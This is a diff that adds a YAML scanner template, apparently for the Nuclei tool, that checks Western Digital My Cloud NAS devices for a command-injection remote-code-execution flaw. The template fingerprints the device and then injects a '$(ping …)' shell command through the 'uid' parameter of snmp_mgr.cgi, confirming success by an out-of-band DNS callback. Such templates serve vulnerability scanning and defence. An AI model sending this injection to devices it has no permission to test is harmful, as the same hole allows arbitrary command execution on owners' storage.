@@ -1,0 +1,38 @@
+id: poc-yaml-west-nas-cgi-snmpv3-delete-one-record-rce
+info:
+  name: Western Digital NAS cgi_SNMPv3_delete_one_record Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  reverse_dns_log: '{{interactsh-url}}'
+
+http:
+  - id: fingerprint-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "WDMyCloud"
+        part: body
+
+  - id: vulnerability-check
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_delete_one_record&uid=%24(ping%20{{reverse_dns_log}})"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
